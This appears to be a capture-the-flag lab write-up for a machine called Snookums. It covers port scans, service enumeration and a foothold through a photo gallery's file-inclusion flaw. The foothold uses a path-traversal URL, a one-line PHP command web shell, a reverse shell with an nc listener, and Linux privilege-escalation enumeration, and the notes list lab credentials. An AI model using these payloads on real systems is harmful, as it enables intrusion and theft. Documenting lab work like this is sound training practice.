**Metadata**

- IP Address:  192.168.162.58
- Hostname: Snookums
- OS: 	Unix / CentOS 7
- Found Credentials/Users:
Michael:HockSydneyCertify123
Josh:MobilizeHissSeedtime747
Serena:OverallCrestLean000
Root:MalapropDoffUtilize1337 (MySql)

Main Objectives:

Local.txt = 5b454ee55cf8dd4e7450f1e533c4e6ff
Proof.txt = 334ae9e212973d66f380a02432009714

**Enumeration**

1. NMAP Scans (TCP/UDP)

```
[+] Running: Nmap ALL TCP (all ports + versions)
[+] Command: nmap -sS -Pn -n -p- -T4 --open -sV --version-all 192.168.162.58 -oN /home/kali/ProvingGround/Snookums/nmap/full_tcp.nmap -oG /home/kali/ProvingGround/Snookums/nmap/full_tcp.gnmap 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-08 15:47 MST
Nmap scan report for 192.168.162.58
Host is up (0.070s latency).
Not shown: 65527 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         vsftpd 3.0.2
22/tcp    open  ssh         OpenSSH 7.4 (protocol 2.0)
80/tcp    open  http        Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
111/tcp   open  rpcbind     2-4 (RPC #100000)
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: SAMBA)
445/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: SAMBA)
3306/tcp  open  mysql       MySQL (unauthorized)
33060/tcp open  mysqlx      MySQL X protocol listener
Service Info: Host: SNOOKUMS; OS: Unix

[+] Running: Nmap MEDIUM UDP (top 1000 + bounded)
[+] Command: nmap -sU -Pn -n --top-ports 1000 -T4 --open -sV --version-intensity 5 --max-retries 1 --host-timeout 20m 192.168.162.58 -oN /home/kali/ProvingGround/Snookums/nmap/medium_udp.nmap -oG /home/kali/ProvingGround/Snookums/nmap/medium_udp.gnmap 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-08 15:49 MST
Nmap scan report for 192.168.162.58
Host is up.
Skipping host 192.168.162.58 due to host timeout
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1200.35 seconds


```

2. Interesting Ports/Services

```
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         vsftpd 3.0.2
22/tcp    open  ssh         OpenSSH 7.4 (protocol 2.0)
80/tcp    open  http        Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
111/tcp   open  rpcbind     2-4 (RPC #100000)
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: SAMBA)
445/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: SAMBA)
3306/tcp  open  mysql       MySQL (unauthorized)
33060/tcp open  mysqlx      MySQL X protocol listener
Service Info: Host: SNOOKUMS; OS: Unix
```

3. FTP Enumeration (Port 21)

```
FTP (21/tcp) Enumeration & Exploitation – OSCP Cheat Sheet

Metadata
IP: 192.168.162.58
Service: ftp
Version:   vsftpd 3.0.2

1. Initial Detection

21/tcp    open  ftp         vsftpd 3.0.2
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.45.151
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.2 - secure, fast, stable
|_End of status

Look for:

* FTP server type (vsftpd, ProFTPD, Pure-FTPd, FileZilla)
* Exact version numbers
* Anonymous login hints

---

3. Anonymous Login Test (ALWAYS)

ftp-anon: Anonymous FTP login allowed (FTP code 230)

After login:

ls
pwd
cd /
cd pub
binary
passive

Cannot run ls getting stuck.

--2026-01-08 19:21:09--  ftp://anonymous:*password*@192.168.162.58/
           => ‘192.168.162.58/.listing’
Connecting to 192.168.162.58:21... connected.
Logging in as anonymous ... Logged in!
==> SYST ... done.    ==> PWD ... done.
==> TYPE I ... done.  ==> CWD not needed.
==> PASV ... 

---

4. Anonymous Upload Test

Create a test file:

echo test > test.txt

Upload:

put test.txt

ftp> put test.txt
local: test.txt remote: test.txt
229 Entering Extended Passive Mode (|||46125|).


If upload succeeds:

* Check if directory maps to web root
* Attempt webshell upload
* Look for cron/script abuse

---

5. Download Everything (Loot First)

From local machine:

wget -r ftp://anonymous:anonymous@<IP>/

wget -r ftp://anonymous:anonymous@192.168.162.58       
--2026-01-08 19:21:09--  ftp://anonymous:*password*@192.168.162.58/
           => ‘192.168.162.58/.listing’
Connecting to 192.168.162.58:21... connected.
Logging in as anonymous ... Logged in!
==> SYST ... done.    ==> PWD ... done.
==> TYPE I ... done.  ==> CWD not needed.
==> PASV ... 

From ftp client:

ftp> prompt
Interactive mode off.
ftp> mget *
ftp: Can't connect to `192.168.162.58:15497': Connection timed out

Look for:

* Credentials
* .bak / .old / .zip / .tar.gz
* Source code
```

3. SSH Enumeration (Port 22)

```
22/tcp    open  ssh         OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 4a:79:67:12:c7:ec:13:3a:96:bd:d3:b4:7c:f3:95:15 (RSA)
|   256 a8:a3:a7:88:cf:37:27:b5:4d:45:13:79:db:d2:ba:cb (ECDSA)
|_  256 f2:07:13:19:1f:29:de:19:48:7c:db:45:99:f9:cd:3e (ED25519)
```

4. Web Enumeration (Port 80)

```
+ Server: Apache/2.4.6 (CentOS) PHP/5.4.16
  
Site Visit Observations:
1. Simple PHP Photo Gallery v0.8
2. /images/examples directory
3. Uses php

80/tcp    open  http        Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-title: Simple PHP Photo Gallery
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16

[+] Running: Gobuster BASIC (80)
[+] Command: gobuster dir -u http://192.168.162.58:80 -w /usr/share/wordlists/dirb/common.txt -t 50 -o /home/kali/ProvingGround/Snookums/gobuster/Snookums_192.168.162.58_80_dir_basic.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.162.58:80
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 206]
/cgi-bin/             (Status: 403) [Size: 210]
/css                  (Status: 301) [Size: 234] [--> http://192.168.162.58/css/]
/.htpasswd            (Status: 403) [Size: 211]
/.htaccess            (Status: 403) [Size: 211]
/images               (Status: 301) [Size: 237] [--> http://192.168.162.58/images/]
/index.php            (Status: 200) [Size: 2730]
/js                   (Status: 301) [Size: 233] [--> http://192.168.162.58/js/]
/photos               (Status: 301) [Size: 237] [--> http://192.168.162.58/photos/]
Progress: 4613 / 4613 (100.00%)
===============================================================
Finished

[+] Running: Gobuster ADVANCED (80)
[+] Command: gobuster dir -u http://192.168.162.58:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -o /home/kali/ProvingGround/Snookums/gobuster/Snookums_192.168.162.58_80_dir_advanced.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.162.58:80
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 237] [--> http://192.168.162.58/images/]
/photos               (Status: 301) [Size: 237] [--> http://192.168.162.58/photos/]
/css                  (Status: 301) [Size: 234] [--> http://192.168.162.58/css/]
/js                   (Status: 301) [Size: 233] [--> http://192.168.162.58/js/]
Progress: 220459 / 220558 (99.96%)
Progress: 220558 / 220558 (100.00%)===============================================================
Finished

[+] Running: Gobuster FILE search (80)
[+] Command: gobuster dir -u http://192.168.162.58:80 -w /usr/share/wordlists/dirb/common.txt -x php\,asp\,aspx\,jsp\,html\,txt\,bak\,old\,zip\,tar\,tar.gz -t 50 -o /home/kali/ProvingGround/Snookums/gobuster/Snookums_192.168.162.58_80_files.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.162.58:80
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,asp,jsp,html,txt,zip,tar,aspx,bak,old,tar.gz
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 206]
/.hta.jsp             (Status: 403) [Size: 210]
/.hta.html            (Status: 403) [Size: 211]
/.hta.php             (Status: 403) [Size: 210]
/.hta.zip             (Status: 403) [Size: 210]
/.hta.aspx            (Status: 403) [Size: 211]
/.hta.tar             (Status: 403) [Size: 210]
/.hta.asp             (Status: 403) [Size: 210]
/.hta.txt             (Status: 403) [Size: 210]
/.hta.tar.gz          (Status: 403) [Size: 213]
/.htaccess.aspx       (Status: 403) [Size: 216]
/.hta.old             (Status: 403) [Size: 210]
/.htaccess.php        (Status: 403) [Size: 215]
/.htaccess.asp        (Status: 403) [Size: 215]
/.htaccess            (Status: 403) [Size: 211]
/.hta.bak             (Status: 403) [Size: 210]
/.htaccess.old        (Status: 403) [Size: 215]
/.htaccess.bak        (Status: 403) [Size: 215]
/.htaccess.tar.gz     (Status: 403) [Size: 218]
/.htaccess.jsp        (Status: 403) [Size: 215]
/.htaccess.zip        (Status: 403) [Size: 215]
/.htaccess.html       (Status: 403) [Size: 216]
/.htpasswd.asp        (Status: 403) [Size: 215]
/.htpasswd.html       (Status: 403) [Size: 216]
/.htpasswd.php        (Status: 403) [Size: 215]
/.htpasswd            (Status: 403) [Size: 211]
/.htpasswd.txt        (Status: 403) [Size: 215]
/.htpasswd.jsp        (Status: 403) [Size: 215]
/.htpasswd.tar        (Status: 403) [Size: 215]
/.htpasswd.aspx       (Status: 403) [Size: 216]
/.htpasswd.old        (Status: 403) [Size: 215]
/.htpasswd.zip        (Status: 403) [Size: 215]
/.htaccess.tar        (Status: 403) [Size: 215]
/.htpasswd.bak        (Status: 403) [Size: 215]
/.htaccess.txt        (Status: 403) [Size: 215]
/.htpasswd.tar.gz     (Status: 403) [Size: 218]
/cgi-bin/.html        (Status: 403) [Size: 215]
/cgi-bin/             (Status: 403) [Size: 210]
/css                  (Status: 301) [Size: 234] [--> http://192.168.162.58/css/]
/db.php               (Status: 200) [Size: 0]
/functions.php        (Status: 200) [Size: 0]
/image.php            (Status: 200) [Size: 1508]
/images               (Status: 301) [Size: 237] [--> http://192.168.162.58/images/]
/index.php            (Status: 200) [Size: 2730]
/index.php            (Status: 200) [Size: 2730]
/js                   (Status: 301) [Size: 233] [--> http://192.168.162.58/js/]
/license.txt          (Status: 200) [Size: 18511]
/photos               (Status: 301) [Size: 237] [--> http://192.168.162.58/photos/]
/README.txt           (Status: 200) [Size: 4041]
Progress: 55146 / 55356 (99.62%)
Progress: 55356 / 55356 (100.00%)===============================================================
Finished

[+] Running: Gobuster LOWERCASE dir (80)
[+] Command: gobuster dir -u http://192.168.162.58:80 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 50 -o /home/kali/ProvingGround/Snookums/gobuster/Snookums_192.168.162.58_80_dir_lowercase.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.162.58:80
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 237] [--> http://192.168.162.58/images/]
/photos               (Status: 301) [Size: 237] [--> http://192.168.162.58/photos/]
/css                  (Status: 301) [Size: 234] [--> http://192.168.162.58/css/]
/js                   (Status: 301) [Size: 233] [--> http://192.168.162.58/js/]
Progress: 207576 / 207641 (99.97%)
Progress: 207641 / 207641 (100.00%)===============================================================
Finished
========

[+] Nikto scan on HTTP ports: 80
[+] Running: Nikto (80)
[+] Command: nikto -h http://192.168.162.58:80 -output /home/kali/ProvingGround/Snookums/web/192.168.162.58_80/nikto.txt -Format txt 
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.162.58
+ Target Hostname:    192.168.162.58
+ Target Port:        80
+ Start Time:         2026-01-08 16:22:45 (GMT-7)
---------------------------------------------------------------------------
+ Server: Apache/2.4.6 (CentOS) PHP/5.4.16
+ /: Retrieved x-powered-by header: PHP/5.4.16.
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ /images: IP address found in the 'location' header. The IP is "127.0.0.2". See: https://portswigger.net/kb/issues/00600300_private-ip-addresses-disclosed
+ /images: The web server may reveal its internal or real IP in the Location header via a request to with HTTP/1.0. The value is "127.0.0.2". See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-0649
+ PHP/5.4.16 appears to be outdated (current is at least 8.1.5), PHP 7.4.28 for the 7.4 branch.
+ Apache/2.4.6 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ PHP/5.4 - PHP 3/4/5 and 7.0 are End of Life products without support.
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+ /: HTTP TRACE method is active which suggests the host is vulnerable to XST. See: https://owasp.org/www-community/attacks/Cross_Site_Tracing
+ /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184
+ /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184
+ /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184
+ /css/: Directory indexing found.
+ /css/: This might be interesting.
+ /db.php: This might be interesting: has been seen in web logs from an unknown scanner.
+ /icons/: Directory indexing found.
+ /images/: Directory indexing found.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ /license.txt: License file found may identify site software.
+ 8908 requests: 0 error(s) and 20 item(s) reported on remote host
+ End Time:           2026-01-08 16:34:30 (GMT-7) (705 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

4. RPC Port 111 Enumeration 

```
111/tcp   open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind

rpcinfo -p 192.168.162.58

rpcclient -U "username%password" 192.168.162.58/

rpcclient -U "username%password" 192.168.162.58/ -c 'stop service_name'
```

5. SMB Port 139, 445 Enumeration

```
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: SAMBA)
445/tcp   open  netbios-ssn Samba smbd 4.10.4 (workgroup: SAMBA)

| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.10.4)
|   Computer name: snookums
|   NetBIOS computer name: SNOOKUMS\x00
|   Domain name: \x00
|   FQDN: snookums
|_  System time: 2026-01-08T18:09:32-05:00
| smb2-time: 
|   date: 2026-01-08T23:09:33
|_  start_date: N/A


smbclient -L //192.168.162.58             
Password for [WORKGROUP\kali]:
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (Samba 4.10.4)
Reconnecting with SMB1 for workgroup listing.
Anonymous login successful

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        SAMBA    

smbmap -H 192.168.162.58    
[+] IP: 192.168.162.58:445      Name: 192.168.162.58            Status: NULL Session
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        IPC$                                                    NO ACCESS       IPC Service (Samba 4.10.4)
              

smbclient //192.168.162.58/IPC$ -N    
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
smb: \> dir



```

6. MySQL (Port 3306 and 33060)

```
3306/tcp  open  mysql       MySQL (unauthorized)
33060/tcp open  mysqlx      MySQL X protocol listener

```

7. Possible Exploits

```
http://192.168.162.58/image.php?img=../../../../../../etc/passwd

root:x:0:0:root:/root:/bin/bash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin sync:x:5:0:sync:/sbin:/bin/sync shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown halt:x:7:0:halt:/sbin:/sbin/halt mail:x:8:12:mail:/var/spool/mail:/sbin/nologin operator:x:11:0:operator:/root:/sbin/nologin games:x:12:100:games:/usr/games:/sbin/nologin ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin nobody:x:99:99:Nobody:/:/sbin/nologin systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin dbus:x:81:81:System message bus:/:/sbin/nologin polkitd:x:999:998:User for polkitd:/:/sbin/nologin sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin postfix:x:89:89::/var/spool/postfix:/sbin/nologin chrony:x:998:996::/var/lib/chrony:/sbin/nologin michael:x:1000:1000:Michael:/home/michael:/bin/bash apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/false tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin

/etc/hostname
snookums
/proc/version
Linux version 3.10.0-1127.10.1.el7.x86_64 (mockbuild@kbuilder.bsys.centos.org) (gcc version 4.8.5 20150623 (Red Hat 4.8.5-39) (GCC) ) #1 SMP Wed Jun 3 14:28:03 UTC 2020
/etc/issue
\S Kernel \r on an \m


https://github.com/beauknowstech/SimplePHPGal-RCE.py
SIm

https://www.exploit-db.com/exploits/48424

```

8. Other Notes

```

```

**Initial Foothold** 

1. Exploit Steps:

-  Navigated to http://192.168.162.58/image.php?img=../../../../../etc/passwd and first verified LFI.

![[Pasted image 20260111154656.png]]

- Created test php shell.

```
echo '<?=system($_GET['cmd']);?>' > cmd.php
python -m http.server 80

```

- Confirmed it there was an LFI as mentioned in the 48424 exploit DB writeup.

![[Pasted image 20260111155303.png]]

- Using the https://github.com/pentestmonkey/php-reverse-shell created reverse shell on my host.

```
nano rev.php //copy in and edit php reverse shell
python -m http.server 80
```

- Setup nc listener. Used a port that I thought they might listening on based open ports.

```
nc -nvlp 445
```

- Executed reverse shell using RFI vulnerability by visiting.

![[Pasted image 20260111160037.png]]

- Received reverse shell as apache. 

![[Pasted image 20260111160155.png]]


2. Shell Access

```
# Linxu shell upgrade
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

**Post-Exploitation**

1. Basic System Info

```
# Linux
hostname
snookums

uname -a
Linux snookums 3.10.0-1127.10.1.el7.x86_64 #1 SMP Wed Jun 3 14:28:03 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux

cat /etc/os-release 2>/dev/null
NAME="CentOS Linux"
VERSION="7 (Core)"
ID="centos"

env
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin
PWD=/
LANG=C
NOTIFY_SOCKET=/run/systemd/notify
SHLVL=2
_=/usr/bin/env

echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin

find / -writable -type d 2>/dev/null | head
/dev/mqueue
/dev/shm
/proc/1985/task/1985/fd
/proc/1985/fd
/proc/1985/map_files
/var/tmp
/var/lib/php/session
/var/lib/dav
/var/cache/httpd
/var/cache/httpd/proxy

find / -perm -4000 -type f 2>/dev/null
/usr/bin/chage
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/su
/usr/bin/sudo
/usr/bin/mount
/usr/bin/umount
/usr/bin/crontab
/usr/bin/pkexec
/usr/bin/fusermount
/usr/bin/passwd
/usr/sbin/unix_chkpwd
/usr/sbin/pam_timestamp_check
/usr/sbin/usernetctl
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/libexec/dbus-1/dbus-daemon-launch-helper

find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
-rwsr-xr-x. 1 root root 73888 Aug  8  2019 /usr/bin/chage
-rwsr-xr-x. 1 root root 78408 Aug  8  2019 /usr/bin/gpasswd
-rws--x--x. 1 root root 23968 Apr  1  2020 /usr/bin/chfn
-rws--x--x. 1 root root 23880 Apr  1  2020 /usr/bin/chsh
-rwsr-xr-x. 1 root root 41936 Aug  8  2019 /usr/bin/newgrp
-rwsr-xr-x. 1 root root 32128 Apr  1  2020 /usr/bin/su
---s--x--x. 1 root root 147336 Apr  1  2020 /usr/bin/sudo
-rwsr-xr-x. 1 root root 44264 Apr  1  2020 /usr/bin/mount
-rwsr-xr-x. 1 root root 31984 Apr  1  2020 /usr/bin/umount
-rwsr-xr-x. 1 root root 57656 Aug  8  2019 /usr/bin/crontab
-rwsr-xr-x. 1 root root 23576 Apr  1  2020 /usr/bin/pkexec
-rwsr-xr-x. 1 root root 32096 Oct 30  2018 /usr/bin/fusermount
-rwsr-xr-x. 1 root root 27856 Mar 31  2020 /usr/bin/passwd
-rwsr-xr-x. 1 root root 36272 Apr  1  2020 /usr/sbin/unix_chkpwd
-rwsr-xr-x. 1 root root 11232 Apr  1  2020 /usr/sbin/pam_timestamp_check
-rwsr-xr-x. 1 root root 11296 Mar 31  2020 /usr/sbin/usernetctl
-rwsr-xr-x. 1 root root 15432 Apr  1  2020 /usr/lib/polkit-1/polkit-agent-helper-1
-rwsr-x---. 1 root dbus 58024 Mar 14  2019 /usr/libexec/dbus-1/dbus-daemon-launch-helper

cat /etc/crontab 2>/dev/null
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=root

# For details see man 4 crontabs

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  

ls -la /etc/cron.*
-rw-------. 1 root root  0 Aug  8  2019 /etc/cron.deny

/etc/cron.d:
total 16
drwxr-xr-x.  2 root root   21 Jun  9  2020 .
drwxr-xr-x. 79 root root 8192 Jan 12 21:44 ..
-rw-r--r--.  1 root root  128 Aug  8  2019 0hourly

/etc/cron.daily:
total 20
drwxr-xr-x.  2 root root   42 Jun  9  2020 .
drwxr-xr-x. 79 root root 8192 Jan 12 21:44 ..
-rwx------.  1 root root  219 Mar 31  2020 logrotate
-rwxr-xr-x.  1 root root  618 Oct 30  2018 man-db.cron

/etc/cron.hourly:
total 16
drwxr-xr-x.  2 root root   22 Jun  9  2014 .
drwxr-xr-x. 79 root root 8192 Jan 12 21:44 ..
-rwxr-xr-x.  1 root root  392 Aug  8  2019 0anacron

/etc/cron.monthly:
total 12
drwxr-xr-x.  2 root root    6 Jun  9  2014 .
drwxr-xr-x. 79 root root 8192 Jan 12 21:44 ..

/etc/cron.weekly:
total 12
drwxr-xr-x.  2 root root    6 Jun  9  2014 .
drwxr-xr-x. 79 root root 8192 Jan 12 21:44 ..

crontab -l 2>/dev/null

getcap -r / 2>/dev/null
/usr/bin/newgidmap = cap_setgid+ep
/usr/bin/newuidmap = cap_setuid+ep
/usr/bin/ping = cap_net_admin,cap_net_raw+p
/usr/sbin/arping = cap_net_raw+p
/usr/sbin/clockdiff = cap_net_raw+p
/usr/sbin/suexec = cap_setgid,cap_setuid+ep

ls -l /etc/shadow
----------. 1 root root 802 Jun  9  2020 /etc/shadow

ls -la /  
total 20
dr-xr-xr-x.  17 root root  224 Jun  9  2020 .
dr-xr-xr-x.  17 root root  224 Jun  9  2020 ..
lrwxrwxrwx.   1 root root    7 Jun  9  2020 bin -> usr/bin
dr-xr-xr-x.   5 root root 4096 Jun  9  2020 boot
drwxr-xr-x.  19 root root 3100 Jan 12 21:44 dev
drwxr-xr-x.  79 root root 8192 Jan 12 21:44 etc
drwxr-xr-x.   3 root root   21 Jun  9  2020 home
lrwxrwxrwx.   1 root root    7 Jun  9  2020 lib -> usr/lib
lrwxrwxrwx.   1 root root    9 Jun  9  2020 lib64 -> usr/lib64
drwxr-xr-x.   2 root root    6 Apr 11  2018 media
drwxr-xr-x.   2 root root    6 Apr 11  2018 mnt
drwxr-xr-x.   2 root root    6 Apr 11  2018 opt
dr-xr-xr-x. 176 root root    0 Feb 26  2025 proc
dr-xr-x---.   3 root root  163 Jan 12 21:44 root
drwxr-xr-x.  28 root root  820 Feb 26  2025 run
lrwxrwxrwx.   1 root root    8 Jun  9  2020 sbin -> usr/sbin
drwxr-xr-x.   2 root root    6 Apr 11  2018 srv
dr-xr-xr-x.  13 root root    0 Feb 26  2025 sys
drwxrwxrwt.   2 root root    6 Feb 26  2025 tmp
drwxr-xr-x.  13 root root  155 Jun  9  2020 usr
drwxr-xr-x.  21 root root 4096 Jun  9  2020 var


```

2. User Enumeration

```
# Linux
whoami
apache

id
uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0

cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:999:998:User for polkitd:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
chrony:x:998:996::/var/lib/chrony:/sbin/nologin
michael:x:1000:1000:Michael:/home/michael:/bin/bash
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/false
tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin
rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin


ls -la /home
total 0
drwxr-xr-x.  3 root    root     21 Jun  9  2020 .
dr-xr-xr-x. 17 root    root    224 Jun  9  2020 ..
drwx------.  2 michael michael 100 Jul  9  2020 michael

sudo -l
sudo su

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

sudo: no tty present and no askpass program specified



```

3. Network Information

```
# Linux
ss -tulwn
Netid  State      Recv-Q Send-Q Local Address:Port               Peer Address:Port              
udp    UNCONN     0      0         *:929                   *:*                  
udp    UNCONN     0      0         *:111                   *:*                  
udp    UNCONN     0      0      127.0.0.1:323                   *:*                  
udp    UNCONN     0      0      [::]:929                [::]:*                  
udp    UNCONN     0      0      [::]:111                [::]:*                  
udp    UNCONN     0      0         [::1]:323                [::]:*                  
tcp    LISTEN     0      50        *:139                   *:*                  
tcp    LISTEN     0      128       *:111                   *:*                  
tcp    LISTEN     0      128       *:22                    *:*                  
tcp    LISTEN     0      50        *:445                   *:*                  
tcp    LISTEN     0      128    [::]:3306               [::]:*                  
tcp    LISTEN     0      50     [::]:139                [::]:*                  
tcp    LISTEN     0      128    [::]:111                [::]:*                  
tcp    LISTEN     0      128    [::]:80                 [::]:*                  
tcp    LISTEN     0      32     [::]:21                 [::]:*                  
tcp    LISTEN     0      128    [::]:22                 [::]:*                  
tcp    LISTEN     0      50     [::]:445                [::]:*                  
tcp    LISTEN     0      70     [::]:33060              [::]:*   

netstat -tulnp 2>/dev/null
```

4. Software, Service, and Process Information

```
# Linux
dpkg -l 
ps aux
ps -ef

```

4. Loot files.
```
# Linux

grep -R "password" /etc 2>/dev/null | head

ls -la /var/www 2>/dev/null
total 8
drwxr-xr-x.  4 root root   33 Jun  9  2020 .
drwxr-xr-x. 21 root root 4096 Jun  9  2020 ..
drwxr-xr-x.  2 root root    6 Apr  2  2020 cgi-bin
